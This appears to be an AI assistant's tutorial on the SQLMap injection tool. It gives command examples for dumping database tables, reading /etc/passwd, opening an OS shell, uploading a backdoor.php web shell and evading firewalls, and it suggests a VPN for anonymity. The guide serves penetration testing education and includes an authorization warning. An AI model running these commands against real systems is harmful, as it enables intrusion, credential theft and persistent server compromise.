Certainly! Here's a **complete, detailed guide** to **SQLMap**, one of the most powerful and automated SQL injection tools available, widely used in **penetration testing** and **bug bounty hunting**.

---

## 🛠️ What is SQLMap?

**SQLMap** is an **open-source penetration testing tool** that automates the process of detecting and exploiting **SQL injection (SQLi)** vulnerabilities in **web applications**.

It can:

* Detect different types of SQL injections
* Extract data from databases
* Bypass login pages
* Read/write files on the server
* Take over databases

---

## 📦 Key Features

| Feature                                  | Description                                                          |
| ---------------------------------------- | -------------------------------------------------------------------- |
| 🎯 Supports all SQL injection techniques | Boolean-based, time-based, error-based, UNION query, stacked queries |
| 🔄 Database fingerprinting               | Identifies DBMS type and version                                     |
| 📂 Data extraction                       | DB names, tables, columns, entries                                   |
| 🧪 Database takeover                     | OS commands, read/write files                                        |
| 🔑 Auth support                          | Supports cookies, sessions, headers, proxies                         |
| 🚀 Automatic                             | Fast and intelligent automation                                      |
| 🔐 Bypass WAFs                           | Many evasion techniques                                              |

---

## 🧠 Supported Databases

* MySQL
* PostgreSQL
* Oracle
* Microsoft SQL Server
* Microsoft Access
* SQLite
* SAP MaxDB
* IBM DB2
* Sybase
* Firebird

---

## ✅ Installation

SQLMap is **pre-installed in Kali Linux**.

If not, install it:

```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev
python3 sqlmap.py -h
```

---

## 🧾 Basic Syntax

```bash
sqlmap -u <URL> [options]
```

* `-u` → Target URL
* `--data` → POST data
* `--cookie` → Use session cookies
* `-p` → Specify vulnerable parameters
* `--dbs` → List databases
* `--tables` → List tables
* `--columns` → List columns
* `--dump` → Dump data
* `--os-shell` → Get OS shell (if possible)
* `--file-read` / `--file-write` → Read/write server files

---

## 🧪 Types of SQL Injection Detected

* Boolean-based blind
* Time-based blind
* Error-based
* UNION query-based
* Stacked queries
* Out-of-band (OOB)

---

## ⚙️ Common Options

| Option           | Purpose                           |
| ---------------- | --------------------------------- |
| `--level`        | Injection depth (1–5, default: 1) |
| `--risk`         | Risk level (1–3, default: 1)      |
| `--batch`        | No prompts (auto-confirm)         |
| `--random-agent` | Random user-agent                 |
| `--proxy`        | Use proxy (e.g., Burp)            |
| `--threads`      | Use multiple threads              |
| `--tamper`       | Evade WAF with tamper scripts     |

---

## 📌 Examples (Most Important Section)

---

### 1. 🔍 Detect SQL Injection (GET)

```bash
sqlmap -u "http://example.com/product.php?id=1"
```

✔️ Detects if the `id` parameter is vulnerable.

---

### 2. 🔐 Bypass Login (POST)

```bash
sqlmap -u "http://example.com/login.php" --data="user=admin&pass=123" -p user
```

✔️ Tests `user` parameter in POST request.

---

### 3. 📚 List Databases

```bash
sqlmap -u "http://example.com/item.php?id=1" --dbs
```

✔️ Shows all databases.

---

### 4. 📂 List Tables of a Database

```bash
sqlmap -u "http://example.com/item.php?id=1" -D users --tables
```

✔️ Lists all tables in the `users` database.

---

### 5. 📄 List Columns of a Table

```bash
sqlmap -u "http://example.com/item.php?id=1" -D users -T accounts --columns
```

✔️ Shows all columns in the `accounts` table.

---

### 6. 🧾 Dump Data from Table

```bash
sqlmap -u "http://example.com/item.php?id=1" -D users -T accounts --dump
```

✔️ Extracts and shows full data from the table.

---

### 7. 🐚 Get OS Shell (If Vulnerable)

```bash
sqlmap -u "http://example.com/item.php?id=1" --os-shell
```

✔️ Opens interactive shell (if remote code execution is possible).

---

### 8. 📥 Read File from Server

```bash
sqlmap -u "http://example.com/item.php?id=1" --file-read="/etc/passwd"
```

✔️ Reads the `/etc/passwd` file (Linux).

---

### 9. 📤 Write File to Server

```bash
sqlmap -u "http://example.com/item.php?id=1" --file-write="backdoor.php" --file-dest="/var/www/html/backdoor.php"
```

✔️ Uploads a PHP shell.

---

### 10. 🍪 Authenticated Attack with Cookies

```bash
sqlmap -u "http://example.com/dashboard.php?id=1" --cookie="PHPSESSID=1234abcd"
```

✔️ Useful for testing authenticated pages.

---

### 11. 🔗 Test Custom Headers

```bash
sqlmap -u "http://example.com" --headers="X-Forwarded-For: 127.0.0.1"
```

✔️ Test WAF bypass headers.

---

### 12. 🕵️ Evade WAF using Tamper Scripts

```bash
sqlmap -u "http://example.com/item.php?id=1" --tamper=space2comment
```

✔️ Uses obfuscation to bypass Web Application Firewalls (WAF).

---

## 🧪 SQLMap in Burp Suite Workflow

1. Intercept request in Burp
2. Right-click → **"Copy as cURL"**
3. Use with SQLMap:

```bash
sqlmap -r request.txt
```

Or:

```bash
sqlmap -u "..." --cookie="..." --data="..."
```

---

## 🧠 Tips for Advanced Use

* Use `--batch` to automate answers in scripting.
* Use `--risk 3 --level 5` for deeper testing.
* Use `--dump-all` to get all data (careful, noisy).
* Combine with VPN/Proxy for anonymity.
* Monitor HTTP traffic with `--proxy=http://127.0.0.1:8080` (for Burp Suite).

---

## 📌 Real-World Example

```bash
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs
```

✔️ Public test site for learning and testing SQLMap.

---

## 🔐 Legal and Ethical Use

* ✅ Only use on systems you **own** or have **explicit permission** to test.
* ❌ Never use SQLMap on public or third-party sites without authorization.
* ⚠️ Unauthorized use can lead to **legal consequences**.

---

## 🧰 Tools Similar to SQLMap

| Tool               | Use                               |
| ------------------ | --------------------------------- |
| **NoSQLMap**       | Attacks NoSQL (MongoDB) databases |
| **Havij**          | GUI-based SQL injection tool      |
| **jSQL Injection** | Java-based GUI for SQLi           |
| **sqlninja**       | Focuses on Microsoft SQL Server   |
| **Burp Suite Pro** | Manual testing with extensions    |

---

## 🏁 Conclusion

**SQLMap** is one of the most powerful and essential tools for **automated SQL injection testing**. Whether you're a beginner learning SQLi or a professional pentester, SQLMap simplifies the attack workflow—from detection to database dumping and server exploitation.

---
 